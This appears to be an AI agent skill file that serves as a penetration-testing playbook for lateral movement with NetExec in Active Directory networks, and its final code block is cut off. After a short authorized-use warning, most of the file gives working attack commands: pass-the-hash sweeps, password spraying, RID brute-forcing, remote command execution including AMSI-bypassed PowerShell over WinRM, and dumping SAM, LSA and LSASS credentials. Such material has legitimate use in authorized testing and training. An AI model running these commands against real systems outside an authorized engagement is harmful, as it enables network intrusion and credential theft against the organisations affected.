---
name: moving-laterally-with-netexec
description: "Use NetExec (nxc) to validate credentials, enumerate SMB shares, users, and policies, perform safe password spraying, execute remotely, and dump SAM across SMB, WinRM, LDAP, MSSQL, and SSH modules. Signals: NetExec, lateral movement."
zh-signals: "用 NetExec(nxc)验证凭据、枚举 SMB 共享/用户/策略、安全口令喷射、远程执行、跨 SMB/WinRM/LDAP/MSSQL/SSH 模块转储 SAM/信号:netexec,横向移动。"
when-to-use: Use NetExec (nxc) to validate credentials, enumerate SMB shares/users/policy, password-spray safely across lockout thresholds, execute commands, and dump SAM/LSA/NTDS credentials across SMB, WinRM, LD
domain: cybersecurity
subdomain: penetration-testing
tags:
- netexec
- lateral-movement
- smb
- password-spraying
- credential-access
- active-directory
- winrm
- post-exploitation
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- DE.CM-01
mitre_attack:
- T1021.002
---
# Moving Laterally with NetExec

> **Authorized Use Only:** This skill is for authorized penetration testing, red-team engagements, and educational labs only. NetExec authenticates to, executes code on, and extracts credentials from remote hosts. Running it against systems you do not own or lack explicit written authorization to test is illegal under computer-misuse laws (e.g. the US CFAA, UK Computer Misuse Act). Confirm scope and rules of engagement before use.

## Overview

NetExec (`nxc`) is the actively maintained successor to CrackMapExec, a network-service swiss-army knife for assessing and exploiting Windows/Active Directory and Linux environments. It wraps Impacket and other libraries behind a unified CLI so an operator can authenticate against many hosts at once, validate harvested credentials, spray passwords, enumerate shares/users/policies, execute commands, and dump credentials — all while logging cleanly for reporting.

NetExec is protocol-oriented: every invocation starts with a protocol module. As of the 2025 releases it supports **smb, winrm, mssql, ldap, ssh, ftp, wmi, rdp, vnc, and nfs**. Command execution (`-x`/`-X`) is available on SMB, WINRM, SSH, MSSQL, WMI and (since summer 2025) RDP. A built-in module system (`-M`) adds capabilities such as LAPS retrieval, LSASS dumping via `lsassy`, BloodHound collection, and share spidering.

For lateral movement specifically, NetExec maps directly to MITRE ATT&CK **T1021.002 (Remote Services: SMB/Windows Admin Shares)**: it authenticates over SMB (port 445), reaches `ADMIN$`/`C$`, and uses named-pipe or task-scheduler execution to run code on remote machines. The `(Pwn3d!)` marker in output signals that the supplied principal has local-admin code-execution rights on a host — the green light for lateral movement.

## When to Use

- During an internal network penetration test after obtaining one or more valid credentials/hashes, to identify every host where those credentials grant admin access.
- To perform controlled password spraying against a domain while respecting lockout thresholds.
- To enumerate SMB shares, domain users, password policy, and loggedon sessions across a subnet in one sweep.
- To execute commands or dump SAM/LSA/NTDS credentials on authorized targets during post-exploitation.
- To collect BloodHound data or LAPS passwords using NetExec modules instead of separate tooling.

## Prerequisites

- A Linux operator host (Kali/Parrot/Ubuntu). Install via pipx (recommended):
  ```bash
  sudo apt install -y pipx git
  pipx ensurepath
  pipx install git+https://github.com/Pennyw0rth/NetExec
  # verify
  nxc --version
  nxc smb --help
  ```
- Docker alternative:
  ```bash
  git clone https://github.com/Pennyw0rth/NetExec
  cd NetExec
  docker build -t netexec .
  docker run --rm -it netexec smb --help
  ```
- Network reachability to target ports (445/SMB, 5985-5986/WinRM, 389-636/LDAP, 1433/MSSQL).
- Valid credentials, NT hashes, or Kerberos tickets within an authorized scope.
- A signed rules-of-engagement document and knowledge of the account-lockout policy before spraying.

## Objectives

- Validate harvested credentials across a host range and locate `(Pwn3d!)` admin access.
- Enumerate shares, users, and password policy over SMB and LDAP.
- Conduct lockout-safe password spraying with `--continue-on-success`.
- Execute commands on authorized hosts and select an appropriate `--exec-method`.
- Dump SAM, LSA, and NTDS credentials and collect them into the NetExec workspace.
- Drive AD attacks (Kerberoasting, ASREPRoast, BloodHound collection) through LDAP modules.

## MITRE ATT&CK Mapping

| Technique ID | Official Name | How NetExec Implements It |
|--------------|---------------|---------------------------|
| T1021.002 | Remote Services: SMB/Windows Admin Shares | Authenticates over SMB to `ADMIN$`/`C$` and executes code on remote hosts (`-x`, `--exec-method`) |
| T1110.003 | Brute Force: Password Spraying | One password against many accounts with `--continue-on-success` |
| T1003.002 | OS Credential Dumping: Security Account Manager | `--sam` dumps local SAM hashes |
| T1003.004 | OS Credential Dumping: LSA Secrets | `--lsa` dumps LSA secrets and cached credentials |
| T1003.006 | OS Credential Dumping: DCSync | `--ntds` via drsuapi extracts the domain database |
| T1558.003 | Steal or Forge Kerberos Tickets: Kerberoasting | `ldap --kerberoasting` requests service tickets |
| T1087.002 | Account Discovery: Domain Account | `--users`, `--rid-brute` enumerate domain accounts |
| T1135 | Network Share Discovery | `--shares`, `-M spider_plus` enumerate accessible shares |

## Workflow

### 1. Validate credentials and find admin access
Sweep a subnet with a credential pair or NT hash. A trailing `(Pwn3d!)` marks hosts where the principal has admin code execution — these are your lateral-movement targets.
```bash
# Cleartext password across a /24
nxc smb 192.168.1.0/24 -u jsmith -p 'Summer2025!' -d corp.local

# Pass-the-hash (NT only or LM:NT)
nxc smb 192.168.1.0/24 -u Administrator -H '13b29964cc2480b4ef454c59562e675c'
nxc smb 10.10.10.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c' --local-auth
```

### 2. Enumerate the environment
Pull users, shares, password policy, loggedon sessions, and active sessions to plan movement.
```bash
nxc smb dc01.corp.local -u jsmith -p 'Summer2025!' --users
nxc smb dc01.corp.local -u jsmith -p 'Summer2025!' --pass-pol
nxc smb 192.168.1.0/24 -u jsmith -p 'Summer2025!' --shares
nxc smb 192.168.1.0/24 -u jsmith -p 'Summer2025!' --loggedon-users --sessions
# RID brute for accounts when listing is blocked
nxc smb dc01.corp.local -u jsmith -p 'Summer2025!' --rid-brute 10000
```

### 3. Password-spray safely
Spray one password against a user list, staying under the lockout threshold. `--continue-on-success` keeps testing every account instead of stopping at the first hit.
```bash
# Discover the lockout policy FIRST
nxc smb dc01.corp.local -u jsmith -p 'Summer2025!' --pass-pol

# Spray a single password across many users
nxc smb dc01.corp.local -u users.txt -p 'Welcome2025!' --continue-on-success

# Validate a credential set across the domain without bruteforcing
nxc ldap dc01.corp.local -u users.txt -p 'Spring2025!' --continue-on-success --no-bruteforce
```

### 4. Execute commands on authorized hosts
On `(Pwn3d!)` targets, run commands and choose a quieter execution channel when needed.
```bash
# Default execution
nxc smb 192.168.1.50 -u Administrator -H <hash> -x 'whoami /all'

# Pick an exec method: smbexec, wmiexec, atexec, mmcexec
nxc smb 192.168.1.50 -u Administrator -H <hash> --exec-method wmiexec -x 'hostname'

# PowerShell over WinRM (amsi-bypassed, base64-encoded transparently)
nxc winrm 192.168.1.50 -u Administrator -H <hash> -X '$PSVersionTable'
```

### 5. Dump credentials
Harvest local and domain credentials from authorized hosts to fuel further movement.
```bash
# Local SAM hashes and LSA secrets
nxc smb 192.168.1.50 -u Administrator -H <hash> --sam --lsa

# In-memory LSASS dump via the lsassy module
nxc smb 192.168.1.50 -u Administrator -H <hash> -M lsassy

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
